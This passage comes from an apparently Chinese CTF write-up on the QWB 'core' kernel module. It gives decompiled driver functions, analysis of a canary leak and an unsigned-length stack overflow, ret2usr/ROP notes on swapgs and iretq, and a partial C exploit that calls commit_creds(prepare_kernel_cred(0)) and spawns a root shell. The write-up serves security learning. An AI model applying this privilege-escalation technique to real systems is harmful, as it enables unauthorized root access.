class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">core_read</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// rdi</span><br>  __int64 i; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-keyword">unsigned</span> __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br><br>  v6 = __readgsqword(<span class="hljs-number">0x28</span>u);                    <span class="hljs-comment">// 开了canary</span><br>  printk(&amp;unk_25B);                             <span class="hljs-comment">// &quot;core: called core_read&quot;</span><br>  printk(&amp;unk_275, off, a1);                    <span class="hljs-comment">// &quot;%d %p&quot;, off, a1</span><br>  v2 = v5;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">16LL</span>; i; --i )<br>  &#123;<br>    *(_DWORD *)v2 = <span class="hljs-number">0</span>;<br>    v2 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);<br>  result = copy_to_user(a1, &amp;v5[off], <span class="hljs-number">64LL</span>);<br>  <span class="hljs-keyword">if</span> ( !result )<br>    <span class="hljs-keyword">return</span> __readgsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>  __asm &#123; swapgs &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>write:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">core_write</span><span class="hljs-params">(__int64 a1, __int64 a2, <span class="hljs-keyword">unsigned</span> __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  printk(&amp;unk_215);                             <span class="hljs-comment">// &quot;core: called core_writen&quot;</span><br>  <span class="hljs-keyword">if</span> ( a3 &lt;= <span class="hljs-number">2048</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )<span class="hljs-comment">// 2048 bytes in @name</span><br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)a3;<br>  printk(&amp;unk_230);                             <span class="hljs-comment">// &quot;core: error copying data from userspacen&quot;</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFF2</span>LL;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ioctl:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">core_ioctl</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">switch</span> ( (_DWORD)a2 )<br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889B</span>:<br>      core_read(a3);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889C</span>:<br>      printk(&amp;unk_2CD, a3);                     <span class="hljs-comment">// &quot;core: %d&quot;, a3</span><br>      off = a3;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0x6677889A</span>:<br>      printk(&amp;unk_2B3);                         <span class="hljs-comment">// &quot;core: called core_copy&quot;</span><br>      core_copy_func(a3);<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>copy_func:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">core_copy_func</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  _QWORD v2[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br><br>  v3 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  printk(&amp;unk_215);                             <span class="hljs-comment">// &quot;core: called core_copy&quot;</span><br>  <span class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">63</span> )<br>  &#123;<br>    printk(&amp;unk_2A1);                           <span class="hljs-comment">// &quot;Detect Overflow&quot;</span><br>    result = <span class="hljs-number">0xFFFFFFFF</span>LL;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    result = <span class="hljs-number">0LL</span>;<br>    qmemcpy(v2, &amp;name, (<span class="hljs-keyword">unsigned</span> __int16)a1);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>要注意的一点是xref的使用, 我看到的都是引用而不是写入就以为没有相关代码, 实际上有一处引用是用作函数<code>copy_from_user()</code>的参数, 所以是有写入的操作的.</p><p>IDA相应reference type:</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">r  <span class="hljs-keyword">Read</span><br>w  <span class="hljs-keyword">Write</span><br>rw <span class="hljs-keyword">Read</span>/<span class="hljs-keyword">Write</span><br>o  <span class="hljs-keyword">Reference</span><br></code></pre></div></td></tr></table></figure><p>有时间就看下IDA的文档, 说不定有新东西.</p></blockquote><p>总结: </p><p>read函数把栈上内容加off后copy_to_user 64字节, 但是在此之前已经清空过数组全部的64字节.</p><p>ioctl有三个选项, read, 修改off(无限制), 把bss段的name变量复制a3字节到栈顶上(小于数组的64字节, <strong>但是是无符号数</strong>). </p><p>write函数copy_from_user到name变量里(小于2048字节). </p><p>文件有canary+NX, 没有RELRO+PIE. </p><h4 id="调试"><a href="#调试" class="headerlink" title="调试:"></a>调试:</h4><p>gdb中用<code>target remote :1234</code>加上<code>add-symbol-file vmlinux</code>即可.</p><p>通过查看<code>/sys/module/sections/.text</code>找到该module的base address, 为<code>0xffffffffc0000000</code>. 当然, 这是为了调试, 否则kaslr是<strong>默认开启</strong>的, 而且只能被root用户读取.</p><p>后来加上的: gef查看ksym中的module符号失败, 只能通过在qemu里用root用户查看. 没明白gef好在哪里. 命令还少一点. </p><h4 id="过程"><a href="#过程" class="headerlink" title="过程:"></a>过程:</h4><blockquote><p>之前在pwncollege的shellcode是单独一块区域, 这个题目是在栈上, 如果使用了上一个函数的栈空间可能就会出问题了, 这次内核可能就真的崩了. 还是学着他那样做吧, 使用iret, 用c的内联汇编保存一点东西.</p></blockquote><ul><li>利用<code>ioctl()</code>中off指定的leak, 得到canary和core_ioctl()的返回地址.</li><li><code>write()</code>中无符号溢出覆盖, 可写入任意长度. 此时构建ROP chain.</li><li>ROP chain包括: <ul><li>执行<code>commit_creds(prepare_kernel_cred(0))</code>, 其中两个内核函数的地址要通过<code>/tmp/kallsyms</code>,<br>要在c里遍历文件找到地址. </li><li>要注意的是实际环境中kaslr是开启的, 这里有几个数值需要<strong>提前计算</strong>:<br>vmlinux未开aslr的基址: <code>0xffffffff81000000</code><br>运行中在kallsyms里找到的函数地址: 可用来计算运行时内核基址.</li><li>vmlinux中gadget的地址和实际运行时的有偏差, 由上面两个数值计算得出后可以消除.<br>所以gadget的地址可以先行写出.</li><li>ROP chain的结尾通过iret返回, 这一条指令会额外pop出cs, EFLAGS, </li><li>the processor pops the return instruction pointer, return code segment selector, and EFLAGS image from the stack to the EIP, CS, and EFLAGS registers</li></ul></li><li>写入canary+修改返回地址到ROP chain. </li><li>然后要返回用户态. WiKi里用了iret, 所以要保存一点其他东西. </li></ul><p>exp: (perfect exploitation)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 见CTF-WiKi or below</span><br></code></pre></div></td></tr></table></figure><blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* below here defined by x86-64 hardware */</span><br><span class="hljs-keyword">size_t</span> rip;<br><span class="hljs-keyword">uint32_t</span> cs;<br><span class="hljs-keyword">uint32_t</span> padding4;<br><span class="hljs-keyword">size_t</span> eflags;<br><span class="hljs-comment">/* below here only when crossing rings, such as from user to kernel */</span><br><span class="hljs-keyword">size_t</span> rsp;<br><span class="hljs-keyword">uint16_t</span> ss;  <span class="hljs-comment">//higher 48 bits are discarded</span><br></code></pre></div></td></tr></table></figure></blockquote><h3 id="Ret2user"><a href="#Ret2user" class="headerlink" title="Ret2user"></a>Ret2user</h3><p>题目还是和上一题一样. 换一种方法.</p><p>ret2usr 攻击利用了 <strong>用户空间的进程不能访问内核空间，但内核空间能访问用户空间</strong> 这个特性来定向内核代码或数据流指向用户控件，以 <code>ring 0</code> 特权执行用户空间代码完成提权等操作.</p><p>只能在linux虚拟机里面做了, windows下用共享文件夹加上ssh不好整, 再整理一下HOME文件夹.</p><blockquote><p>压缩包解压出来的vmlinux和cpio解压的不一样……. 完全搞不懂为什么. 暂且换掉.</p></blockquote><blockquote><p><code>commit_creds(prepare_kernel_cred(0))</code> </p><ul><li><code>struct cred *prepare_kernel_cred(struct task_struct *daemon)</code> </li><li><code>int commit_creds(struct cred *new)</code> </li></ul></blockquote><ul><li>最后的rop_chain写入是通过ioctl, 数值从<code>int64_t</code>被截断为<code>int16_t</code>, 所以最后两字节填上一个合适的数字即可.</li><li>一开始写的时候直接往core使用read, 但是在IDA里面在<code>Exports</code>窗口里查看core_fops结构体里面没有core_read的指针, 只能在ioctl里面调用read.</li><li>由于kallsyms文件是在insmod之前复制到tmp文件夹下的, 所以其中没有core的各个函数地址.</li><li>parse_kallsyms里用文件读取又栽了.<ul><li>没有料到一行会有四个字符串, 最后一个<code>[core]</code>用来指示模块名称, 导致fscanf输入错误.</li><li>还是换成了<code>fgets()</code>先输入一行, 再对这一行进行<code>sscanf</code> </li><li><code>scanf</code>和<code>printf</code>要注意格式参数, <code>scanf</code>可以使用<code>%Lx | %llx</code>, <code>printf</code>可以使用<code>%p | %llx</code>来输出8字节指针的值.</li><li>长文件读取分析的中间要输出点东西, 不然一开始我还以为是分析太慢了. 不能低估电脑的这点计算能力, 一定是死循环.</li></ul></li><li>还有一个symbol: <code>amd_uncore_read</code>也匹配上了<code>core_read</code>的字符串判断. 还是从<code>strstr</code>换成了<code>strcmp</code>.</li><li>内核的函数好像都不会破坏用户区的rbp, 或者说只用rsp来索引栈上的数值.</li><li>读取栈上的数据出来后不需要strtoll, 已经是小端法存储的size_t了, 只要转换指针类型然后赋值即可.</li></ul><h4 id="接下来是swapgs的科普"><a href="#接下来是swapgs的科普" class="headerlink" title="接下来是swapgs的科普:"></a>接下来是swapgs的科普:</h4><ul><li>结合pwn.college中kernel部分时的查找, 多了几个概念: <a href="https://wiki.osdev.org/Model_Specific_Registers">MSR</a>(Model Specific Registers), <a href="https://wiki.osdev.org/SWAPGS">swapgs的超详细doc</a> |<br><a href="https://akkadia.org/drepper/tls.pdf">ELF Handling For Thread-Local Storage</a> | </li><li>(P2873 in Intel manual) one kind of MSR: Instruction-specific support (for example: SYSENTER, SYSEXIT, SWAPGS, etc.).<br>and P1866 fro swapgs instruction: SWAPGS exchanges the current GS base register value with the value contained in MSR address C0000102H(IA32_KERNEL_GS_BASE)</li><li>To acquire the kernel space stack <strong>after <code>swapgs</code></strong>, in entry_SYSCALL_64:<br><code>mov rsp, PER_CPU_VAR(cpu_current_top_of_stack)</code>,<br>expanding to <code>mov rsp, %gs:cpu_current_top_of_stack</code>,<br>GS register stores the base address for per-cpu data area. </li><li>由上面来个总结:  kernel stores the address of the <strong>per-CPU structure</strong> in MSR. </li></ul><p>和pwn.college不一样的地方在于这里破坏了内核栈帧, 对上一个函数的栈帧造成了未知的影响, 所以选用了iret直接退出内核态. 而在pwn.college中shellcode被存放到了另一块区域, 而且通过<code>__x86_indirect_thunk_rax</code>这个函数里<code>jmp rax</code>直接跳过去. 在code中使用ret回到了device_read等函数中, 正常走内核的流程退回到用户态, 所以我就没有关心过swapgs这个知识点. </p><h4 id="还有一个ropper的使用"><a href="#还有一个ropper的使用" class="headerlink" title="还有一个ropper的使用:"></a>还有一个ropper的使用:</h4><ul><li>ropper可以使用交互式命令行. </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">Documented commands (<span class="hljs-built_in">type</span> <span class="hljs-built_in">help</span> &lt;topic&gt;):<br>========================================<br>arch        color           gadgets    jmp     ropchain  show       <br>asm         detailed        <span class="hljs-built_in">help</span>       load    search    stack_pivot<br>badbytes    disasm          <span class="hljs-built_in">hex</span>        opcode  semantic  string     <br>clearcache  disasm_address  imagebase  ppr     <span class="hljs-built_in">set</span>       <span class="hljs-built_in">type</span>       <br>close       file            inst       quit    settings  unset      <br><br>Undocumented commands:<br>======================<br>EOF<br></code></pre></div></td></tr></table></figure><ul><li>file用来先加载文件或者显示已打开的文件</li><li>hex: 将文件某一部分用hex打印出来</li><li>search: 简单通配符搜索, semantic: 有条件的搜索</li><li>type: 在ROP, JOP, SYS三种类型之中修改.</li><li>ropchain作用有限, 只有三种操作.</li><li>disasm: 反汇编给定的十六进制数字串</li><li>inst: 在装key_stone后按照instruction搜索.</li><li>show: show infomatino about the context.</li><li>ppr: pop pop ret instruction.</li><li>在命令行中的参数也基本同理, 全加上<code>--</code>即可.</li><li>在交互界面中直接<code>file vmlinux; search swapgs;</code>即可找出.</li></ul><blockquote><p>还有一点区别, 就是EFLAGS and RFLAGS, 在64位系统中FLAG寄存器被拓展到64bit, <del>使用<code>popfq</code>而不是<code>popf</code>来弹出保存在栈上的内容</del>. The upper 32 bits of RFLAGS is <strong>reserved</strong>.<br>POPFQ pops 64 bits from the stack. Reserved bits of RFLAGS (including the upper 32 bits of RFLAGS) are not affected.</p><p>这三个编码都一样, 只是用在不同的环境下当做助记符了. pushf和pushfq都是把rflags push到栈上. <strong>push同理</strong>. </p><table><thead><tr><th>Opcode</th><th>Instruction</th><th>Op/En</th><th>64-Bit Mode</th><th>Compat/Leg Mode</th><th>Description</th></tr></thead><tbody><tr><td>9D</td><td>POPF</td><td>ZO</td><td>Valid</td><td>Valid</td><td>Pop top of stack into <strong>lower</strong> 16 bits of EFLAGS.</td></tr><tr><td>9D</td><td>POPFD</td><td>ZO</td><td>N.E.</td><td>Valid</td><td>Pop top of stack into EFLAGS.</td></tr><tr><td>9D</td><td>POPFQ</td><td>ZO</td><td>Valid</td><td>N.E.</td><td>Pop top of stack and <strong>zero-extend</strong> into RFLAGS.</td></tr></tbody></table></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// gcc exp.c -static -masm=intel -g -o exp</span><br><span class="hljs-comment">// 至少绝大部分是我write by hand. 自己动手还是会发现很多细节. </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEBUG 0</span><br><span class="hljs-keyword">size_t</span> commit_addr, prepare_addr;<br><span class="hljs-keyword">size_t</span> vmlinux_base, canary;<br><span class="hljs-keyword">size_t</span> user_cs, user_eflags, user_rsp, user_ss;<br><span class="hljs-keyword">int</span> proc_fd;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> VMLINUX_RAW_BASE 0xffffffff81000000</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PROC_PATH <span class="hljs-meta-string">&quot;/proc/core&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DEBUG</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KAS_PATH <span class="hljs-meta-string">&quot;/proc/kallsyms&quot;</span> </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KAS_PATH <span class="hljs-meta-string">&quot;/tmp/kallsyms&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">// read two function address from file</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">parse_kallsyms</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    FILE *kas_fd = fopen(KAS_PATH, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (kas_fd == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] open %s fail!&quot;</span>, KAS_PATH);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">150</span>];<br>    <span class="hljs-keyword">size_t</span> addr;<br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">60</span>];<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> i = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (fgets(buf, <span class="hljs-number">150</span>, kas_fd) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%Lx %*c %s&quot;</span>, &amp;addr, name);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>            commit_addr = addr;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>            prepare_addr = addr;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DEBUG</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;core_ioctl&quot;</span>))<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ioctl addr: %p\n&quot;</span>, addr);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;core_read&quot;</span>))<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;core_read addr: %p\n&quot;</span>, addr);<br>        i++;<br>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">1000</span> == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\t%s&quot;</span>, name);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;commit_creds addr: %p\n&quot;</span>, commit_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_addr);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DEBUG</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pause for core_read breakpoint&quot;</span>);<br>    getchar();<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    In [8]: hex(elf.symbols[&#x27;commit_creds&#x27;]-0xffffffff81000000)</span><br><span class="hljs-comment">    Out[8]: &#x27;0x9c8e0&#x27;    */</span><br>    vmlinux_base = commit_addr - <span class="hljs-number">0x9c8e0</span>;<br>&#125;<br><br><span class="hljs-comment">// get canary from ioctl</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set_off</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> offset)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(proc_fd, <span class="hljs-number">0x6677889C</span>, offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Set off as %d\n&quot;</span>, offset);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">read_proc</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] read to buf.&quot;</span>);<br>    ioctl(proc_fd, <span class="hljs-number">0x6677889B</span>, buf);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_canary</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    set_off(<span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">64</span>];<br>    read_proc(buf);<br>    <span class="hljs-comment">// canary = strtoull(buf, NULL, 16);</span><br>    canary = *((<span class="hljs-keyword">size_t</span> *)buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;canary: 0x%x\n&quot;</span>, canary);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_context</span><span class="hljs-params">()</span></span>;<br><span class="hljs-comment">// get shell and root privilege.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_shell</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_root</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *(*pkc)(<span class="hljs-keyword">int</span>) = prepare_addr;<br>    <span class="hljs-keyword">void</span> (*cc)(<span class="hljs-keyword">char</span> *) = commit_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set_rop</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> *rop)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// get_root-&gt;ret from kernel-&gt;get_shell(as rip)</span><br>    <span class="hljs-keyword">size_t</span> vm_off = vmlinux_base - VMLINUX_RAW_BASE;<br>    rop[<span class="hljs-number">8</span>] = canary;<br>    rop[<span class="hljs-number">10</span>] = (<span class="hljs-keyword">size_t</span>)get_root;<br>    rop[<span class="hljs-number">11</span>] = <span class="hljs-number">0xffffffff81a012da</span> + vm_off; <span class="hljs-comment">// swapgs; popfq; ret</span><br>    rop[<span class="hljs-number">12</span>] = <span class="hljs-number">0</span>;<br>    rop[<span class="hljs-number">13</span>] = <span class="hljs-number">0xffffffff81050ac2</span> + vm_off; <span class="hljs-comment">// iretq; ret;</span><br>    rop[<span class="hljs-number">14</span>] = (<span class="hljs-keyword">size_t</span>)get_shell;<br>    rop[<span class="hljs-number">15</span>] = user_cs;<span class="hljs-number">3</span><br>    rop[<span class="hljs-number">16</span>] = user_eflags;<br>    rop[<span class="hljs-number">17</span>] = user_rsp;<br>    rop[<span 